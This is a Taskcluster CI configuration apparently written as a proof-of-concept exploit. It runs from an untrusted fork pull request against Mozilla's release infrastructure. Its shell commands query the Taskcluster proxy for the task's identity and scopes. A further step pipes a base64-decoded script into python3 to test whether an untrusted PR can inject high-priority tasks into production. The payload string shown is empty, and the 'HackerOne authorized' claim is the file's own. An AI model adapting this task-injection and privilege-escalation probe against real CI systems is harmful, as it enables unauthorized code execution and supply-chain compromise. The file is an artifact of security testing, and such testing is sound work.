---
version: 1
policy:
  pullRequests: public_restricted
tasks:
  - $if: 'tasks_for == "github-pull-request-untrusted"'
    then:
      taskId: { $eval: as_slugid("poc_untrusted_pr_v7_a") }
      created: { $fromNow: '' }
      deadline: { $fromNow: '1 hour' }
      expires: { $fromNow: '1 day' }
      provisionerId: releng-1
      workerType: decision
      payload:
        maxRunTime: 900
        features:
          taskclusterProxy: true
        image: "mozillareleases/taskgraph:decision-v24.1.1@sha256:c2cf963f7621b0f64dc142a04ddcc179d36afdd05c6dc1c2d198d97b55ecb394"
        command:
          - /bin/sh
          - -c
          - |
            echo '=== [A] Runtime identity (proves untrusted fork PR runs as pull-request-untrusted) ==='
            echo "taskId (env): $TASK_ID"
            echo "taskGroupId (env): $TASK_GROUP_ID"
            curl -sS "http://taskcluster/queue/v1/task/$TASK_ID" | python3 -c "import sys,json; d=json.load(sys.stdin); print('workerType:', d.get('workerType')); print('provisionerId:', d.get('provisionerId')); print('schedulerId:', d.get('schedulerId')); print('stored scopes field (empty => inherit role scopes):', d.get('scopes'))"
            echo
            echo '=== [B] CRITICAL scope test: queue:create-task:highest:releng-1/* from untrusted PR ==='
            echo 'Decoded + executed via taskcluster-proxy. A clean HTTP 200 proves task injection into Mozilla PRODUCTION.'
            echo "B64SCRIPT_START"
            echo "" | base64 -d | python3
            echo "B64SCRIPT_END"
      metadata:
        name: "POC v7: untrusted PR task-injection (HackerOne authorized)"
        description: "Authorized security test — prove pull-request-untrusted role grants queue:create-task:highest:releng-1/* in Mozilla production"
        owner: "1253628375ltf@gmail.com"
        source: "https://github.com/ltfafei/fxci-config/pull/1118"
      extra:
        github:
          events:
            - pull_request
          taskcluster_pull_request_number: { $eval: 'event.number' }
